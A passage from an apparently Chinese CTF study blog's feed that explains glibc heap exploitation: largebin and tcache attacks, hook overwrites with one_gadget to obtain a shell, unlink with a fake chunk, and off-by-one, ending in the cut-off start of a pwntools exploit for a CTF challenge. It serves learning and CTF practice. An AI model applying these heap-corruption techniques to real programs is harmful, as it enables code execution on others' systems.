class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;   <span class="comment">//这个循环会一直运行直到victim大小大于等于fwd</span></span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">              == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;  <span class="comment">//相等则放到后面,无需更改nextsize,每次都是如此，也就是说新来的相同大小的 chunk 永远是放在第二个位置</span></span><br><span class="line">                      <span class="comment">//注意!!展示的代码并没有在这种情况真正将victim加入largebin的代码</span></span><br><span class="line">                      <span class="comment">//事实上这块代码都只是针对nextsize链表操作的</span></span><br><span class="line">                      <span class="comment">//真正对fd,bk操作的代码下方未展示</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;<span class="comment">//若大于</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);  <span class="comment">//检查fwd是否合规</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>largebin attack就是出现在这个提取chunk的过程中</p><h2 id="Large-bin-attack利用条件"><a href="#Large-bin-attack利用条件" class="headerlink" title="Large bin attack利用条件"></a>Large bin attack利用条件</h2><ul><li>可以修改一个large bin chunk的data</li><li><p>从unsorted bin中来的large bin chunk要紧跟在被构造过的chunk的后面</p></li><li><p>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</p></li><li>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</li></ul><h1 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h1><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。任意地址作为chunk操作</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨,因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。也就是造成一个chunk可以被无数次取出利用</p><h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><p>通过tcache posioning将tcache链中的某个chunk指向他cacheperthread本身,因为 tcache_perthread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><p>与fastbin的house of spirit一个原理,因为没有检查反而更简单,不需要伪造nextsize等</p><h2 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h2><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>利用smallbin中的chunk转移到tcache的漏洞</p><h2 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h2><p>与无tcache相比得先填满tcache</p><h2 id="tcache-check"><a href="#tcache-check" class="headerlink" title="tcache check"></a>tcache check</h2><p>新版本中<code>tcache_entry</code>中增加了一项<code>struct tcache_perthread_struct *key</code>，将<code>chunk</code>放入<code>tcache</code>后，会将<code>key</code>修改为<code>tcache</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    +  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    +  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>在<code>free</code>的时候，如果发现<code>key</code>为<code>tcache</code>就要进行<code>double free</code>的检查，这是因为<code>key</code>位于<code>bk</code>的位置，而<code>tcache</code>也不清除<code>chunk</code>，存在很小的可能碰巧为<code>tcache</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span><br><span class="line">+      &#123;</span><br><span class="line">+       tcache_entry *tmp;</span><br><span class="line">+       LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">+       <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">+            tmp;</span><br><span class="line">+            tmp = tmp-&gt;next)</span><br><span class="line">+         <span class="keyword">if</span> (tmp == e)</span><br><span class="line">+           malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">+       <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a few</span></span><br><span class="line"><span class="comment">+          cycles, but don&#x27;t abort.  */</span></span><br><span class="line">+      &#125;</span><br></pre></td></tr></table></figure><p>因为很少发生，这里的检查也比较彻底，会检查该<code>tc_idx</code>中的每一项是否和当前要释放的堆块相同。这个<code>check</code>可以通过改写<code>key</code>来绕过。</p>]]></content>
    
    
    <summary type="html">bin attack!!</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="堆利用" scheme="https://ixout.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    <category term="fastbin" scheme="https://ixout.github.io/tags/fastbin/"/>
    
  </entry>
  
  <entry>
    <title>堆利用-2</title>
    <link href="https://ixout.github.io/posts/61137/"/>
    <id>https://ixout.github.io/posts/61137/</id>
    <published>2023-03-30T01:12:55.000Z</published>
    <updated>2023-06-19T07:35:38.605Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在调用malloc或者free的时候，如果 <strong>malloc_hook 和free_hook的值存在</strong>，<strong>则会调用malloc_hook或者free_hook指向的地址</strong>，假设在使用one_gadget的时候满足one_gadget的调用条件，当overwrite malloc_hook和free_hook的时候，便可以getshell，执行malloc的时候，其参数是size大小，所以overwrite malloc_hook的时候使用one_gadget的地址可以getshell。执行free的时候，可以将__free_hook的值overwrite为system的地址，通过释放(/bin/sh\x00)的chunk，可以达到system(/bin/sh)来getshell</p><ul><li>malloc_hook位于main_arena下方的位置(绝大多时候是0x10)，可以通过fake chunk来overwrite该值实现getshell</li><li>free_hook 位于libc上_free_hook上，可以通过fake chunk来overwrite该值达到劫持程序流的目的</li></ul><h1 id="malloc-hook利用"><a href="#malloc-hook利用" class="headerlink" title="malloc_hook利用"></a>malloc_hook利用</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><ul><li>利用思路：在执行malloc时，会检测__malloc_hook的值，如果malloc_hook的值存在，将调用malloc_hook指向的地址call rax，如果我们将该值overite 为one_gadget，当程序执行malloc的时候，便可以getshell</li></ul><h1 id="free-hook利用"><a href="#free-hook利用" class="headerlink" title="free_hook利用"></a>free_hook利用</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>利用思路：<ul><li>通过改写main_arena中的top_chunk的地址，将top_chunk的值改写到<strong>free_hook上方指定的位置，通过不断向top_chunk申请chunk，最终可以分配到包含</strong>free_hook的区块，从而可以改写__free_hook的值。</li><li>通过改写global_max_fast的值，可以在free_hook的上方找到一个足够大包含free_hook的块，当改写了global_max_fast后，向heap申请的块都将按照fastbin来处理</li><li>通过unsorted bin attack 在free_hook上方<strong>伪造 0x7f大小的chunk</strong>,再通过fastbin attack 来修改free_hoook的值</li></ul></li></ul><h1 id="realloc-hook与malloc-hook的联合利用"><a href="#realloc-hook与malloc-hook的联合利用" class="headerlink" title="realloc_hook与malloc_hook的联合利用"></a>realloc_hook与malloc_hook的联合利用</h1><p>因为</p><p>realloc_hook与malloc_hook 相似是一个弱类型的指针.在调用realloc()函数是会判断realloc_hook的值是否为空,不为空则执行其执行的代码.这是realloc_hook的一种用法。</p><p>大多时候在执行onegadget时,并不容易满足限制条件,故而可以利用realloc()来调整栈帧以满足条件</p><p>即可以用malloc_hook来指向_libc_realloc()函数内部(即强行调用realloc())然后通过realloc_hook来触发one_gadget.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000009</span>AE84 <span class="number">41</span> <span class="number">57</span>                         push    r15</span><br><span class="line">.text:<span class="number">000000000009</span>AE86 <span class="number">41</span> <span class="number">56</span>                         push    r14</span><br><span class="line">.text:<span class="number">000000000009</span>AE88 <span class="number">41</span> <span class="number">55</span>                         push    r13</span><br><span class="line">.text:<span class="number">000000000009</span>AE8A <span class="number">41</span> <span class="number">54</span>                         push    r12</span><br><span class="line">.text:<span class="number">000000000009</span>AE8C <span class="number">49</span> <span class="number">89</span> F4                      mov     r12, rsi</span><br><span class="line">.text:<span class="number">000000000009</span>AE8F <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">000000000009</span>AE90 <span class="number">48</span> <span class="number">89</span> FD                      mov     rbp, rdi</span><br><span class="line">.text:<span class="number">000000000009</span>AE93 <span class="number">53</span>                            push    rbx</span><br><span class="line">.text:<span class="number">000000000009</span>AE94 <span class="number">48</span> <span class="number">83</span> EC <span class="number">18</span>                   sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">000000000009</span>AE98 <span class="number">48</span> <span class="number">8B</span> <span class="number">05</span> <span class="number">41</span> <span class="number">11</span> <span class="number">15</span> <span class="number">00</span>          mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:<span class="number">000000000009</span>AE9F <span class="number">48</span> <span class="number">8B</span> <span class="number">00</span>                      mov     rax, [rax]</span><br><span class="line">.text:<span class="number">000000000009</span>AEA2 <span class="number">48</span> <span class="number">85</span> C0                      test    rax, rax</span><br><span class="line">.text:<span class="number">000000000009</span>AEA5 <span class="number">0F</span> <span class="number">85</span> <span class="number">35</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>             jnz     loc_9B0E0</span><br></pre></td></tr></table></figure><p><code>malloc -&gt; malloc_hook -&gt; realloc -&gt; realloc_hook -&gt; onegadget</code></p><p>我们可以将realloc_hook改为onegadget，然后通过这些push和sub操作”微调”rsp寄存器，使其能够满足在调用realloc_hook（也就是onegadget）的时候满足相应的rsp条件。相应的利用方法就是由传统的直接修改malloc_hook变为先修改realloc_hook为onegadget之后，修改malloc_hook到特定的一个push处或sub处，然后调用malloc便相当于执行了满足条件的onegadget。</p><p><strong>此外符号__malloc_hook与__realloc_hook在数据段中是相邻的,realloc在前</strong></p><p><strong>__free_hook的位置与前二者不相邻</strong></p><p>参数也有差异,_malloc_hook与__realloc_hook的参数为申请的chunk的大小</p><p>__free_hook的参数则为释放的chunk的地址</p>]]></content>
    
    
    <summary type="html">hook</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="堆利用" scheme="https://ixout.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆利用-1</title>
    <link href="https://ixout.github.io/posts/61329/"/>
    <id>https://ixout.github.io/posts/61329/</id>
    <published>2023-03-28T08:35:27.000Z</published>
    <updated>2023-06-20T08:38:16.072Z</updated>
    
    <content type="html"><![CDATA[<span class='p blue h4'>四个基础漏洞，其他利用方式大多要用到它们</span><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p><strong>unlink宏</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>对于非largebin来说有两次检查</p><p>可以看到<code>unlink()</code>函数首先检查当前 chunk 的 size 和下一个 chunk 的 prev_size 是否相等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查后一个 chunk 的 bk 和前一个 chunk 的 fd 是否指向当前 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != p || BK-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>本节只是简要的过一遍流程,这部分知识网上很全,学习过程中一定要注意讲解中提到的指针和地址的区别(虽然指针和地址其实是一个东西)</strong></p><p>我们先假设伪造了一个 fake chunk 可以成功利用 unlink。这时我们可以通过溢出的方式将某个 chunk 的 prev_size 改写成这个 chunk 到 fake chunk 的距离，并将 size 的 P 位改成 0，然后对该 chunk 进行<code>free()</code>，就触发了后向合并，此时会对 fake chunk 进行 unlink。</p><p>我们如何利用 unlink 呢？我们伪造的 fake chunk 需要满足<code>FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p</code>，才能让<code>FD-&gt;bk = BK;BK-&gt;fd = FD;</code>。如果我们有一个指向 fake chunk 的指针的地址时好像就有办法了。我们先设指向 fake chunk 的指针为<code>ptr</code>，然后构造一个这样的 fake chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd = &amp;ptr<span class="number">-0x18</span>;</span><br><span class="line">bk = &amp;ptr<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure><p>此时的FD和BK:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD == &amp;ptr<span class="number">-0x18</span>;</span><br><span class="line">BK == &amp;ptr<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure><p>在 unlink 执行检查时，发现满足条件，成功通过检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk == *(&amp;ptr<span class="number">-0x18</span>+<span class="number">0x18</span>) == p;</span><br><span class="line">BK-&gt;fd == *(&amp;ptr<span class="number">-0x10</span>+<span class="number">0x10</span>) == p;</span><br></pre></td></tr></table></figure><p>执行 unlink，最后<code>ptr</code>指向<code>&amp;ptr-0x18</code>处的位置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FD-&gt;bk = BK</span></span><br><span class="line"><span class="comment">// *(&amp;ptr-0x10+0x10) = &amp;ptr-0x10;</span></span><br><span class="line">ptr = &amp;ptr<span class="number">-0x10</span>;</span><br><span class="line"><span class="comment">// BK-&gt;fd = FD</span></span><br><span class="line"><span class="comment">// *(&amp;ptr-0x10+0x10) = &amp;ptr-0x18</span></span><br><span class="line">ptr = &amp;ptr<span class="number">-0x18</span></span><br></pre></td></tr></table></figure><p>从利用原理不难看出,利用的一个前提是我们要能够知道该堆块指针的地址(最好是在bss段)</p><p>自己粗糙地画了一幅图,是全部操作完成后的示意图</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-28_213612.png" alt=""></p><p>可以看到本来指向heap地ptr1指针,指向了自己地址的-0x18处</p><details class="folding-tag" yellow><summary> 关于指针加减法 </summary>              <div class='content'>              <p>其实&amp;ptr1-0x18这类写法是不正确的，这样写真正代表的意思是ptr1的地址加上0x18*sizeof(&amp;ptr1所指向的类型)</p><p>一定要这样写的话应该是(long long)&amp;ptr1-0x18</p>              </div>            </details><hr><p><strong>重点!!!:</strong></p><p>unlink过程中使用的chunk地址是chunk真实起始地址,而不是用户可用区域地址,</p><p>但是全局变量中存储的一定是用户可用区域指针,</p><p>所以一定要在真实chunk后立即伪造一个chunk紧跟其后(记得绕过<code>chunksize (p) != prev_size (next_chunk (p))</code>),并修改触发unlink的那个chunk,使得最终被unlink的chunk是这个伪造的chunk,那么其计算得到的伪真实地址其实就是真正的用户可用地址,从而与全局变量相对应</p><hr><h1 id="off—by—one"><a href="#off—by—one" class="headerlink" title="off—by—one"></a>off—by—one</h1><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>其又分为两种</p><ol><li><strong>off-by-one</strong></li><li><strong>off-by-null</strong></li></ol><p>其中第一类包含第二类</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>这三篇我觉得很不错</p><h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p><a href="https://blog.csdn.net/qq_41202237/article/details/108116618">好好说话之off-by-one_hollk的博客-CSDN博客</a></p><p>不过实操时，发现跟这篇博客出入挺大，不知道是不是环境的问题，最终用的另一种方法做出</p><p>exp参考</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">local_path = <span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">io = process(local_path)</span><br><span class="line"><span class="comment"># libc = io.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.binary = local_path</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">option</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(option)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter_author_name</span>(<span class="params">author_name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(author_name)</span><br><span class="line"> </span><br><span 